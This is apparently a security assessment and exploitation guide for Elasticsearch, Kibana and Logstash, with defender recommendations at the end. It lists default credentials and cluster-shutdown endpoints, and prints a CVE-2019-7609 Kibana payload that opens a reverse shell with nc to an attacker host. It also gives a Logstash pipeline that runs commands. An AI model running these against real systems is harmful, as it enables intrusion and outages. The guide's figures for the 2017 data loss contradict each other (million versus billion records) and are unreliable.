# ELK - Security Assessment & Exploitation Guide


---

## Elasticsearch

Elasticsearch is a distributed RESTful search engine that has been frequently targeted in real attacks. In 2019, researchers discovered that threat actors were actively exploiting unsecured Elasticsearch databases to build DDoS botnets, leveraging vulnerabilities like CVE-2014-3120 and CVE-2015-1427 to deploy BillGates malware variants . These attacks resulted in at least 500 million records (approximately 450TB of data) being deleted in ransomware campaigns during 2017 .

### Enumeration

The first step in assessing an Elasticsearch instance is discovering what endpoints are exposed and whether authentication is enforced.

```
# Check cluster status and version information
curl -X GET "ELASTICSEARCH-SERVER:9200/"

# Check if X-Pack security is enabled (returns user list if auth is configured)
curl -X GET "ELASTICSEARCH-SERVER:9200/_xpack/security/user"

# Common default credentials to test
elastic:changeme
kibana_system
logstash_system
beats_system
apm_system
remote_monitoring_user
```

### Useful Discovery Endpoints

These endpoints provide valuable information about the cluster configuration and data stores.

```
# Cluster health status
/_cluster/health

# List all indices (databases)
/_cat/indices

# Cluster health summary
/_cat/health

# Node information
/_cat/nodes
```

### Dangerous Endpoints (Use With Extreme Caution)

The following endpoints can cause denial of service or complete cluster shutdown. In 2022, CVE-2022-23712 was disclosed, showing that an unauthenticated attacker could forcibly shut down an Elasticsearch node with a specifically formatted network request .

```
# These can shut down the entire cluster
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```

### Authenticated Enumeration

Once credentials are obtained, more detailed information about the security configuration becomes accessible.

```
# Using an API key for authentication
curl -H "Authorization: ApiKey <API-KEY>" ELASTICSEARCH-SERVER:9200/

# Get detailed information about a specific user's privileges
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user/<USERNAME>"

# List all users configured on the system
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/user"

# List all roles and their associated privileges
curl -X GET "ELASTICSEARCH-SERVER:9200/_security/role"
```

### Understanding Elasticsearch Permissions

Elasticsearch uses a role-based access control (RBAC) model where users are assigned roles, and roles define permissions. The X-Pack Security module acts as the "gatekeeper + security captain + auditor" for the cluster .

A real-world role configuration example:
```json
{
  "cluster": ["monitor", "manage_index_templates"],
  "indices": [
    {
      "names": ["logs-app-*", "metrics-*"],
      "privileges": ["read", "view_index_metadata"],
      "field_security": {
        "grant": ["@timestamp", "message", "level"]
      },
      "query": "{\"term\": {\"env\": \"production\"}}"
    }
  ]
}
```

**Permission Types Explained** :

| Type | Example Privileges | Purpose |
|------|-------------------|---------|
| Cluster Privileges | monitor, manage_pipeline, all | Control cluster-level operations |
| Index Privileges | read, write, delete, create_index, manage | Control index-level CRUD operations |
| Field Security | Field whitelist/blacklist | Restrict which fields are returned |
| Query Restriction | JSON query DSL | Force additional filtering conditions |

### API Key Usage for Automation

For automated tools and CI/CD pipelines, API keys are the recommended authentication method. They are created with specific role descriptors and can have expiration dates .

```
# Create an API key with restricted permissions
curl -X POST "https://es-cluster:9200/_security/api_key" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "filebeat-prod-writer",
       "role_descriptors": {
         "writer_role": {
           "cluster": ["monitor"],
           "index": [
             {
               "names": ["logs-beats-*"],
               "privileges": ["create_doc", "create_index"]
             }
           ]
         }
       },
       "expiration": "7d"
     }'
```

### Internal Configuration Files

These files often contain sensitive credentials and should be reviewed during post-exploitation.

```
Elasticsearch configuration: /etc/elasticsearch/elasticsearch.yml
Kibana configuration: /etc/kibana/kibana.yml
Logstash configuration: /etc/logstash/logstash.yml
Filebeat configuration: /etc/filebeat/filebeat.yml
Users and roles file: /etc/elasticsearch/users_roles
```

---

## Kibana

Kibana is the visualization platform for Elasticsearch. It runs on port 5601 by default and has been the source of several critical remote code execution vulnerabilities.

### Critical Real-World Vulnerability: CVE-2019-7609

This vulnerability, discovered in 2019, allows arbitrary code execution in Kibana versions before 5.6.15 and 6.6.1. It has a CVSS score of 10.0 (Critical) . The flaw exists in the Timelion visualizer and involves JavaScript prototype chain pollution .

**Affected versions**: Kibana < 6.6.1, Kibana < 5.6.15 

### Exploitation Steps for CVE-2019-7609

The attack is performed in two stages:

**Step 1 - Set up the environment using Vulhub**:
```bash
sysctl -w vm.max_map_count=262144
docker-compose up -d
```

**Step 2 - Access the Timelion page** at `http://target:5601`

**Step 3 - Inject the prototype pollution payload** in the Timelion visualizer:
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("/bin/touch /tmp/success");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

**Step 4 - Trigger execution** by accessing the Canvas page, which executes the injected command .

**Reverse shell payload example** :
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("nc -e /bin/sh attacker-ip 4321");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### Additional Kibana Vulnerabilities

**CVE-2019-7610** (CVSS 9.3): Arbitrary code execution flaw in the security audit logger when `xpack.security.audit.enabled` is set to true. An attacker could send a request that executes JavaScript code .

**CVE-2019-7608** (CVSS 4.3): Cross-site scripting vulnerability in Kibana versions before 5.6.15 and 6.6.1 that could allow an attacker to obtain sensitive information or perform destructive actions on behalf of other Kibana users .

### Basic Kibana Information

```
Port: 5601
Config file location: /etc/kibana/kibana.yml
Default user to test: kibana_system
```

---

## Logstash

Logstash is the data processing pipeline component that ingests, transforms, and outputs data. It has had several vulnerabilities involving credential disclosure and arbitrary file write.

### CVE-2019-7612: Credential Disclosure in Logs

This vulnerability affects Logstash versions before 5.6.15 and 6.6.1. When a malformed URL is specified in the Logstash configuration, credentials for that URL could be inadvertently logged as plaintext in error messages .

**Impact**: Sensitive data disclosure (CVSS 5.0) - credentials appear in log files accessible to anyone with log read permissions.

### CVE-2026-33466: Path Traversal Leading to RCE

This recently disclosed vulnerability (April 2026) affects Logstash and allows arbitrary file write through path traversal. The archive extraction utilities used by Logstash do not properly validate file paths within compressed archives .

**CVSS Score**: 8.1 (High)

**Attack vector**: An attacker who can serve a specially crafted archive to Logstash through a compromised or attacker-controlled update endpoint can write arbitrary files to the host filesystem with the privileges of the Logstash process.

**Escalation path**: When automatic pipeline reloading is enabled (`config.reload.automatic: true`), this can be escalated to remote code execution .

### Basic Logstash Testing

```
Pipeline configuration: /etc/logstash/pipelines.yml

# Check for automatic reloading
grep "config.reload.automatic" /etc/logstash/logstash.yml

# If file wildcard is specified in pipeline, test with custom config
```

### Malicious Pipeline Example for Testing

If the Logstash configuration allows pipeline reloading and uses file wildcards, the following configuration could be used for testing:

```
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

### Historical Attacks on ELK Stack

Real-world attacks against Elasticsearch have included :

1. **DDoS Botnet Formation (2019)**: Threat actors scanned for exposed Elasticsearch servers and deployed BillGates malware variants capable of launching DNS reflection amplification attacks.

2. **Ransomware Campaigns (2017)**: Attackers deleted all indices and demanded 0.2 Bitcoin ransom, resulting in at least 500 billion records (450TB) being wiped.

3. **Data Breaches (2019)**: A public Elasticsearch cluster belonging to Dow Jones exposed 4.4GB of data containing sensitive personal information of government officials, politicians, and politically influential individuals.

### Attack Chain Observed in the Wild 

1. **Reconnaissance**: Attackers search for publicly accessible Elasticsearch databases
2. **Initial Exploit**: Use crafted search queries with encoded Java commands to invoke shell (leveraging CVE-2015-1427 or similar)
3. **First-stage Script**: Attempts to disable firewalls and kill competing cryptocurrency miners
4. **Second-stage Script**: Downloads the final payload, removes competition, cleans traces
5. **Final Payload**: BillGates malware variant that steals system information and joins a DDoS botnet

### Recommendations for Defenders

Based on real incidents, security teams should:
- Never expose Elasticsearch directly to the internet without authentication
- Upgrade to versions beyond 6.6.1 or 5.6.15 (released March 2019)
- Disable Groovy scripting if running older versions (CVE-2015-1427)
- Enable X-Pack security with strong passwords
- Regularly audit roles using `GET /_security/role?pretty` to check for high-risk privileges like `all`, `manage`, `delete_index` 
- Monitor for suspicious Timelion or Canvas activity in Kibana logs
- Ensure automatic pipeline reloading is disabled unless absolutely necessary
- Validate archive files before extraction by Logstash
